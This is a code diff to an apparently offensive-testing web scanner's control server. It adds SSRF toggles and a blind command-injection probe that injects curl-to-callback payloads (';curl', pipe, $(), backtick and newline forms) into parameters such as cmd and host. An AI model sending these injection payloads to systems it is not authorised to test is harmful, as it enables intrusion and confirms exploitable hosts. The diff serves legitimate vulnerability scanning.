@@ -3109,7 +3109,9 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
                 "proxy","fetch","load","u","q",
             };
         if (paramNames.size() > 40) paramNames = paramNames.mid(0, 40);
-        const bool wantXxe = bodyJson.value("xxe").toBool(true);
+        const bool wantXxe  = bodyJson.value("xxe").toBool(true);
+        const bool wantSsrf = bodyJson.value("ssrf").toBool(true);
+        const bool wantRce  = bodyJson.value("rce").toBool(true);
 
         // Build the work list synchronously (mint + register BEFORE firing
         // so a fast callback can't outrun the registry), then fire async.
@@ -3131,7 +3133,7 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
         };
 
         // SSRF vectors: one GET per param name, param value = callback URL.
-        for (const QString &pname : paramNames) {
+        if (wantSsrf) for (const QString &pname : paramNames) {
             const QJsonObject tok = registerShot("ssrf-oast",
                                                  "param:" + pname, pname);
             const QString cbUrl = tok.value("pathUrl").toString();
@@ -3209,6 +3211,42 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
             s.request += "Connection: close\r\n\r\n";
             s.request += xml;
             shots.append(s);
+        }
+
+        // Blind OS command injection: wrap a curl/wget to our HTTP sink in shell
+        // metacharacters and inject it into command-prone params. A vulnerable
+        // shell executes the fetch and the callback lands on the sink -- a
+        // critical blind-RCE confirmation that no response echo can give. (The
+        // sink URL is benign: an HTTP GET to our own collector, no payload.)
+        if (wantRce) {
+            static const char *kCmdParams[] = {
+                "cmd", "exec", "command", "run", "ping", "host", "ip", "target",
+            };
+            // %1 = the HTTP callback URL. Covers ;sep, |pipe, $(...) and `...`
+            // substitution, and a newline-prefixed line so a logged/echoed
+            // command boundary still runs it.
+            static const char *kCmdForms[] = {
+                ";curl %1;", "|curl %1", "$(curl %1)", "`curl %1`", "%0acurl %1",
+            };
+            for (const char *pn : kCmdParams) {
+                const QString pname = QString::fromLatin1(pn);
+                for (const char *cf : kCmdForms) {
+                    const QJsonObject tok = registerShot("rce-oast", "param:" + pname, pname);
+                    const QString cbUrl = tok.value("pathUrl").toString();
+                    const QString payload = QString::fromLatin1(cf).arg(cbUrl);
+                    QString q = existingQuery;
+                    if (!q.isEmpty()) q += "&";
+                    q += pname + "=" + QString::fromUtf8(QUrl::toPercentEncoding(payload));
+                    Shot s;
+                    s.kind = "rce-oast"; s.note = "param:" + pname;
+                    s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
+                    s.request  = "GET " + (basePath + "?" + q).toUtf8() + " HTTP/1.1\r\n";
+                    s.request += "Host: " + host.toUtf8() + "\r\n";
+                    s.request += "User-Agent: Nullock/oast-blast\r\n";
+                    s.request += "Accept: */*\r\nConnection: close\r\n\r\n";
+                    shots.append(s);
+                }
+            }
         }
 
         // Fire everything async; the response returns the fired vectors so
